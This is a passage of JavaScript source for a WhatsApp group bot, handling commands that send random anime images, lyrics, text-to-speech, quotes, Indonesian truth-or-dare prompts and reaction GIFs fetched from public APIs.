if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
if (/waifu2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
Yasam.sendMessage(m.chat, { image: { url: yeha }, caption : mess.berhasil }, { quoted: fvrif })
}
break

case 'lirik': 
			case 'lyrics': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return replygcxeon(mess.limit);
				if (!text) return replygcxeon(`⚠️ Kak, jangan lupa tulis judul lagunya! 🥺\nContoh: *${prefix + command} Someone Like You*`);
				try {
					const searchResults = await lyrics.search(text);
					if (searchResults.length === 0) {
						return replygcxeon('⚠️ Tidak ada hasil yang ditemukan untuk lagu tersebut. Coba judul lain, ya! 🎶');
					}
					const firstResult = searchResults[0];
					let response = `🎵 *Lirik Lagu Ditemukan!* 🎵\n\n`;
					response += `📌 *Judul:* ${firstResult.title}\n`;
					response += `🎤 *Artis:* ${firstResult.artist}\n`;
					response += `💿 *Album:* ${firstResult.album}\n`;
					response += `🔗 *Lirik Lengkap:* ${firstResult.link}\n`;
					response += `🖼️ *Gambar:* ${firstResult.imageUrl || 'Tidak ada gambar'}\n\n`;
					response += `_Sedang mengambil lirik lengkap, tunggu sebentar..._`;
					await replygcxeon(response);
					const lyricsData = await lyrics.getLyrics(firstResult.link);
					let lyricsResponse = `🎼 *Lirik Lengkap: ${firstResult.title}* 🎼\n\n`;
					lyricsResponse += `${lyricsData.lyrics || 'Lirik tidak tersedia.'}\n\n`;
					lyricsResponse += `📅 *Tahun Rilis:* ${lyricsData.year || 'Tidak diketahui'}\n`;
					lyricsResponse += `🎧 *Playlist:* ${lyricsData.playlists || 'Tidak ada playlist'}\n`;
					lyricsResponse += `🖼️ *Artis:* ${lyricsData.artistImage || 'Tidak ada gambar artis'}\n`;
					replygcxeon(lyricsResponse);
				} catch (error) {
					console.error(error);
					replygcxeon('⚠️ Terjadi kesalahan saat mencari lirik lagu. Coba lagi nanti ya, Kak!');
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;
		case 'pick': {
 	if (!m.isGroup) return replygcxeon (mess.group)
 	if (!text) return replygcxeon(`What do you want to pick?\nExample: ${prefix + command} idiot`)
 const groupMetadata = m.isGroup ? await Yasam.groupMetadata(m.chat)
 .catch((e) => {}) : ""
 const participants = m.isGroup ? await groupMetadata.participants : ""
 let member = participants.map((u) => u.id)
 let me = m.sender
 let xeonshimts = member[Math.floor(Math.random() * member.length)]
 Yasam.sendMessage(from, { 
text: `The most *${text}* here is *@${xeonshimts.split("@")[0]}*`,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[xeonshimts],
"externalAdReply": {
"showAdAttribution": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"containsAutoReply": true,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),
"sourceUrl": `${wagc}`
}
}
}, { quoted: fvrif })
 }
 break
 case 'say': case 'tts': case 'gtts':{
if (!text) return replygcxeon('Where is the text?')
 let texttts = text
 const xeonrl = googleTTS.getAudioUrl(texttts, {
 lang: "en",
 slow: false,
 host: "https://translate.google.com",
 })
 return Yasam.sendMessage(m.chat, {
 audio: {
 url: xeonrl,
 },
 mimetype: 'audio/mp4',
 ptt: true,
 fileName: `${text}.mp3`
 }, {
 quoted: fvrif,
 })
 }
 break
 case 'fact': {
 	const { data } = await axios.get(`https://nekos.life/api/v2/fact`)
 return replygcxeon(`${themeemoji} *Fact:* ${data.fact}\n`) 
 }
 break
 case 'quotes':
const quotexeony = await axios.get(`https://favqs.com/api/qotd`)
 const textquotes = `*${themeemoji} Quote:* ${quotexeony.data.quote.body}\n\n*${themeemoji} Author:* ${quotexeony.data.quote.author}`
return replygcxeon(textquotes)
break
case 'truth': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return replygcxeon(mess.limit);
				const truths = [
					'😈 Apa rahasia terbesar yang belum pernah kamu ceritakan ke siapa pun?',
					'🤭 Siapa orang yang diam-diam kamu suka saat ini?',
					'🫣 Pernah bohong sama sahabat sendiri? Tentang apa?',
					'👀 Hal paling memalukan yang pernah kamu alami?',
					'💬 Kalau bisa kembali ke masa lalu, apa yang ingin kamu ubah?'
				];
				const randomTruth = truths[Math.floor(Math.random() * truths.length)];
				replygcxeon(`🤔 *Truth*\n\n${randomTruth}`);
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'dare': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return replygcxeon(mess.limit);
				const dares = [
					'🔥 Kirim chat "Aku suka kamu" ke kontak terakhir yang kamu chat!',
					'😜 Kirim voice note bilang "Aku adalah manusia paling lucu sedunia."',
					'🤡 Foto selfie dengan ekspresi wajah paling aneh dan kirim ke grup!',
					'🕺 Kirim video kamu joget lagu favorit selama 10 detik.',
					'📸 Post story IG dengan caption "Aku lagi kena dare nih, tolong selamatkan!"'
				];
				const randomDare = dares[Math.floor(Math.random() * dares.length)];
				replygcxeon(`😈 *Dare*\n\n${randomDare}`);
				db.data.users[m.sender].limit -= 1;
				break;
			}
 case 'hug': {

 if (!m.isGroup) return replygcxeon (mess.group)
 if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
 var pat = await fetchJson(`https://api.waifu.pics/sfw/hug`)

 try {

 let messsender = m.sender

 let musers = ``
 try {

 users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

 ment = [messsender, users]

 } catch {

 users == "none"

 ment = [messsender, m.sender]

 }

 if (users == "none") {

 musers = `@${m.sender.split("@")[0]} hugged themself!`

 } else {

 musers = `@${m.sender.split("@")[0]} hugged @${users.split("@")[0]} `

 }

 const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

 const buffer = Buffer.from(response.data, "utf-8")

 var fetchedgif = await GIFBufferToVideoBuffer(buffer)

 Yasam.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: fvrif })

 } catch (error) {

 console.log(error);

 }

 }

 break;
 case 'cry': {

 if (!m.isGroup) return replygcxeon (mess.group)
 if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
 var pat = await fetchJson(`https://api.waifu.pics/sfw/cry`)

 try {

 let messsender = m.sender

 let musers = ``
 try {

 users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

 ment = [messsender, users]

 } catch {

 users == "none"

 ment = [messsender, m.sender]

 }

 if (users == "none") {

 musers = `@${m.sender.split("@")[0]} cried themself!`

 } else {

 musers = `@${m.sender.split("@")[0]} cried @${users.split("@")[0]} `

 }

 const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

 const buffer = Buffer.from(response.data, "utf-8")

 var fetchedgif = await GIFBufferToVideoBuffer(buffer)

 Yasam.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: fvrif })

 } catch (error) {

 console.log(error);

 }

 }

 break;
 case 'kill': {

 if (!m.isGroup) return replygcxeon (mess.group)
 if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
 var pat = await fetchJson(`https://api.waifu.pics/sfw/kill`)

 try {

 let messsender = m.sender

 let musers = ``
 try {

 users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

 ment = [messsender, users]

 } catch {

 users == "none"

 ment = [messsender, m.sender]

 }

 if (users == "none") {

 musers = `@${m.sender.split("@")[0]} killed themself!`

 } else {

 musers = `@${m.sender.split("@")[0]} killed @${users.split("@")[0]} `

 }

 const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

 const buffer = Buffer.from(response.data, "utf-8")

 var fetchedgif = await GIFBufferToVideoBuffer(buffer)

 Yasam.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: fvrif })

 } catch (error) {

 console.log(error);

 }

 }

 break;
 case 'pat': {

 if (!m.isGroup) return replygcxeon (mess.group)
 if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
 var pat = await fetchJson(`https://api.waifu.pics/sfw/pat`)

 try {

 let messsender = m.sender

 let musers = ``
 try {

 users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

 ment = [messsender, users]

 } catch {

 users == "none"

 ment = [messsender, m.sender]

 }

 if (users == "none") {

 musers = `@${m.sender.split("@")[0]} patted themself!`

 } else {

 musers = `@${m.sender.split("@")[0]} patted @${users.split("@")[0]} `

 }

 const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

 const buffer = Buffer.from(response.data, "utf-8")

 var fetchedgif = await GIFBufferToVideoBuffer(buffer)

 Yasam.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: fvrif })

 } catch (error) {

 console.log(error);

 }

 }

 break;
 case 'lick': {

 if (!m.isGroup) return replygcxeon (mess.group)
 if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
 var pat = await fetchJson(`https://api.waifu.pics/sfw/lick`)

 try {

 let messsender = m.sender

 let musers = ``
 try {

 users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

 ment = [messsender, users]

 } catch {

 users == "none"

 ment = [messsender, m.sender]

 }

 if (users == "none") {

 musers = `@${m.sender.split("@")[0]} licked themself!`

 } else {

 musers = `@${m.sender.split("@")[0]} licked @${users.split("@")[0]} `

 }

 const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

 const buffer = Buffer.from(response.data, "utf-8")

 var fetchedgif = await GIFBufferToVideoBuffer(buffer)

 Yasam.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: fvrif })

 } catch (error) {

 console.log(error);

 }

 }

 break;
 case 'kiss': {

 if (!m.isGroup) return replygcxeon (mess.group)
 if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
 var pat = await fetchJson(`https://api.waifu.pics/sfw/kiss`)

 try {

 let messsender = m.sender

 let musers = ``
 try {

 users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

 ment = [messsender, users]

 } catch {

 users == "none"

 ment = [messsender, m.sender]

 }

 if (users == "none") {

 musers = `@${m.sender.split("@")[0]} kissed themself!`

 } else {

 musers = `@${m.sender.split("@")[0]} kissed @${users.split("@")[0]} `

 }

 const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

 const buffer = Buffer.from(response.data, "utf-8")

 var fetchedgif = await GIFBufferToVideoBuffer(buffer)

 Yasam.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: fvrif })

 } catch (error) {

 console.log(error);

 }

 }

 break;
 case 'bite': {

 if (!m.isGroup) return replygcxeon (mess.group)
 if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
 var pat = await fetchJson(`https://api.waifu.pics/sfw/cry`)

 try {

 let messsender = m.sender

 let musers = ``
 try {

 users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

 ment = [messsender, users]

 } catch {

 users == "none"

 ment = [messsender, m.sender]

 }

 if (users == "none") {

 musers = `@${m.sender.split("@")[0]} bit themself!`

 } else {

 musers = `@${m.sender.split("@")[0]} bit @${users.split("@")[0]} `

 }

 const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

 const buffer = Buffer.from(response.data, "utf-8")

 var fetchedgif = await GIFBufferToVideoBuffer(buffer)

 Yasam.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: fvrif })

 } catch (error) {

 console.log(error);

 }

 }

 break;

case 'yeet': {

 if (!m.isGroup) return replygcxeon (mess.group)
 if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
 var pat = await fetchJson(`https://api.waifu.pics/sfw/yeet`)

 try {

 let messsender = m.sender

 let musers = ``
 try {

 users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

 ment = [messsender, users]

 } catch {

 users == "none"

 ment = [messsender, m.sender]

 }

 if (users == "none") {

 musers = `@${m.sender.split("@")[0]} yeeted themself!`

 } else {

 musers = `@${m.sender.split("@")[0]} yeeted @${users.split("@")[0]} `

 }

 const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

 const buffer = Buffer.from(response.data, "utf-8")

 var fetchedgif = await GIFBufferToVideoBuffer(buffer)

 Yasam.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: fvrif })

 } catch (error) {

 console.log(error);

 }

 }

 break;
 case 'bully': {

 if (!m.isGroup) return replygcxeon (mess.group)
 if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
 var pat = await fetchJson(`https://api.waifu.pics/sfw/bully`)

 try {

 let messsender = m.sender

 let musers = ``
 try {

 users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

 ment = [messsender, users]

 } catch {

 users == "none"

 ment = [messsender, m.sender]

 }

 if (users == "none") {

 musers = `@${m.sender.split("@")[0]} bullied themself!`

 } else {

 musers = `@${m.sender.split("@")[0]} bullied @${users.split("@")[0]} `

 }

 const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

 const buffer = Buffer.from(response.data, "utf-8")

 var fetchedgif = await GIFBufferToVideoBuffer(buffer)

 Yasam.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: fvrif })

 } catch (error) {

 console.log(error);

 }

 }

 break;
 case 'bonk': {

 if (!m.isGroup) return replygcxeon (mess.group)
 if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
 var pat = await fetchJson(`https://api.waifu.pics/sfw/bonk`)

 try {

 let messsender = m.sender

 let musers = ``
 try {

 users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

 ment = [messsender, users]

 } catch {

 users == "none"

 ment = [messsender, m.sender]

 }

 if (users == "none") {

 musers = `@${m.sender.split("@")[0]} bonked themself!`

 } else {

 musers = `@${m.sender.split("@")[0]} bonked @${users.split("@")[0]} `

 }

 const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

 const buffer = Buffer.from(response.data, "utf-8")

 var fetchedgif = await GIFBufferToVideoBuffer(buffer)

 Yasam.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: fvrif })

 } catch (error) {

 console.log(error);

 }

 }

 break;
 case 'wink': {

 if (!m.isGroup) return replygcxeon (mess.group)
 if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
 var pat = await fetchJson(`https://api.waifu.pics/sfw/wink`)

 try {

 let messsender = m.sender

 let musers = ``
 try {

 users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

 ment = [messsender, users]

 } catch {

 users == "none"

 ment = [messsender, m.sender]

 }

 if (users == "none") {

 musers = `@${m.sender.split("@")[0]} winked themself!`

 } else {

 musers = `@${m.sender.split("@")[0]} winked @${users.split("@")[0]} `

 }

 const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

 const buffer = Buffer.from(response.data, "utf-8")

 var fetchedgif = await GIFBufferToVideoBuffer(buffer)

 Yasam.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: fvrif })

 } catch (error) {

 console.log(error);

 }

 }

 break;
 case 'poke': {

 if (!m.isGroup) return replygcxeon (mess.group)
 if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
 var pat = await fetchJson(`https://api.waifu.pics/sfw/poke`)

 try {

 let messsender = m.sender

 let musers = ``
 try {

 users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

 ment = [messsender, users]

 } catch {

 users == "none"

 ment = [messsender, m.sender]

 }

 if (users == "none") {

 musers = `@${m.sender.split("@")[0]} poked themself!`

 } else {

 musers = `@${m.sender.split("@")[0]} poked @${users.split("@")[0]} `

 }

 const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

 const buffer = Buffer.from(response.data, "utf-8")

 var fetchedgif = await GIFBufferToVideoBuffer(buffer)

 Yasam.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: fvrif })

 } catch (error) {

 console.log(error);

 }

 }

 break;
 case 'nom': {

 if (!m.isGroup) return replygcxeon (mess.group)
 if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
 var pat = await fetchJson(`https://api.waifu.pics/sfw/nom`)

 try {

 let messsender = m.sender

 let musers = ``
 try {

 users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

 ment = [messsender, users]

 } catch {

 users == "none"

 ment = [messsender, m.sender]

 }

 if (users == "none") {

 musers = `@${m.sender.split("@")[0]} nommed themself!`

 } else {

 musers = `@${m.sender.split("@")[0]} nommed @${users.split("@")[0]} `

 }

 const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

 const buffer = Buffer.from(response.data, "utf-8")

 var fetchedgif = await GIFBufferToVideoBuffer(buffer)

 Yasam.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: fvrif })

 } catch (error) {

 console.log(error);

 }

 }

 break;
 case 'slap': {

 if (!m.isGroup) return replygcxeon (mess.group)
 if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
 var pat = await fetchJson(`https://api.waifu.pics/sfw/slap`)

 try {

 let messsender = m.sender

 let musers = ``
 try {

 users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

 ment = [messsender, users]

 } catch {

 users == "none"

 ment = [messsender, m.sender]

 }

 if (users == "none") {

 musers = `@${m.sender.split("@")[0]} slapped themself!`

 } else {

 musers = `@${m.sender.split("@")[0]} slapped @${users.split("@")[0]} `

 }

 const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

 const buffer = Buffer.from(response.data, "utf-8")

 var fetchedgif = await GIFBufferToVideoBuffer(buffer)

 Yasam.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: fvrif })

 } catch (error) {

 console.log(error);

 }

 }

 break;
 case 'smile': {

 if (!m.isGroup) return replygcxeon (mess.group)
 if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
 var pat = await fetchJson(`https://api.waifu.pics/sfw/smile`)

 try {

 let messsender = m.sender

 let musers = ``
 try {

 users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

 ment = [messsender, users]

 } catch {

 users == "none"

 ment = [messsender, m.sender]

 }

 if (users == "none") {

 musers = `@${m.sender.split("@")[0]} smiled themself!`

 } else {

 musers = `@${m.sender.split("@")[0]} smiled @${users.split("@")[0]} `

 }

 const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

 const buffer = Buffer.from(response.data, "utf-8")

 var fetchedgif = await GIFBufferToVideoBuffer(buffer)

 Yasam.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: fvrif })

 } catch (error) {

 console.log(error);

 }

 }

 break;
 case 'wave': {

 if (!m.isGroup) return replygcxeon (mess.group)
 if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
 var pat = await fetchJson(`https://api.waifu.pics/sfw/wave`)

 try {

 let messsender = m.sender

 let musers = ``
 try {

 users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

 ment = [messsender, users]

 } catch {

 users == "none"

 ment = [messsender, m.sender]

 }

 if (users == "none") {

 musers = `@${m.sender.split("@")[0]} waved themself!`

 } else {

 musers = `@${m.sender.split("@")[0]} waved @${users.split("@")[0]} `

 }

 const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

 const buffer = Buffer.from(response.data, "utf-8")

 var fetchedgif = await GIFBufferToVideoBuffer(buffer)

 Yasam.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: fvrif })

 } catch (error) {

 console.log(error);

 }

 }

 break;
 case 'awoo': {

 if (!m.isGroup) return replygcxeon (mess.group)
 if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
 var pat = await fetchJson(`https://api.waifu.pics/sfw/awoo`)

 try {

 let messsender = m.sender

 let musers = ``
 try {

 users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

 ment = [messsender, users]

 } catch {

 users == "none"

 ment = [messsender, m.sender]

 }

 if (users == "none") {

 musers = `@${m.sender.split("@")[0]} awooed themself!`

 } else {

 musers = `@${m.sender.split("@")[0]} awooed @${users.split("@")[0]} `

 }

 const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

 const buffer = Buffer.from(response.data, "utf-8")

 var fetchedgif = await GIFBufferToVideoBuffer(buffer)

 Yasam.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: fvrif })

 } catch (error) {

 console.log(error);

 }

 }

 break;
 case 'blush': {

 if (!m.isGroup) return replygcxeon (mess.group)
 if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
 var pat = await fetchJson(`https://api.waifu.pics/sfw/blush`)

 try {

 let messsender = m.sender

 let musers = ``
 try {

 users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

 ment = [messsender, users]

 } catch {

 users == "none"

 ment = [messsender, m.sender]

 }

 if (users == "none") {

 musers = `@${m.sender.split("@")[0]} blushed themself!`

 } else {

 musers = `@${m.sender.split("@")[0]} blushed @${users.split("@")[0]} `

 }

 const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

 const buffer = Buffer.from(response.data, "utf-8")

 var fetchedgif = await GIFBufferToVideoBuffer(buffer)

 Yasam.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: fvrif })

 } catch (error) {

 console.log(error);

 }

 }

 break;
 case 'smug': {

 if (!m.isGroup) return replygcxeon (mess.group)
 if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
 var pat = await fetchJson(`https://api.waifu.pics/sfw/smug`)

 try {

 let messsender = m.sender

 let musers = ``
 try {

 users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

 ment = [messsender, users]

 } catch {

 users == "none"

 ment = [messsender, m.sender]

 }

 if (users == "none") {

 musers = `@${m.sender.split("@")[0]} smugged themself!`

 } else {

 musers = `@${m.sender.split("@")[0]} smugged @${users.split("@")[0]} `

 }

 const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

 const buffer = Buffer.from(response.data, "utf-8")

 var fetchedgif = await GIFBufferToVideoBuffer(buffer)

 Yasam.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: fvrif })

 } catch (error) {

 console.log(error);

 }

 }

 break;

case 'glomp': {

 if (!m.isGroup) return replygcxeon (mess.group)
 if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
 var pat = await fetchJson(`https://api.waifu.pics/sfw/glomp`)

 try {

 let messsender = m.sender

 let musers = ``
 try {

 users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

 ment = [messsender, users]

 } catch {

 users == "none"

 ment = [messsender, m.sender]

 }

 if (users == "none") {

 musers = `@${m.sender.split("@")[0]} glomped themself!`

 } else {

 musers = `@${m.sender.split("@")[0]} glomped @${users.split("@")[0]} `

 }

 const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

 const buffer = Buffer.from(response.data, "utf-8")

 var fetchedgif = await GIFBufferToVideoBuffer(buffer)

 Yasam.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: fvrif })

 } catch (error) {

 console.log(error);
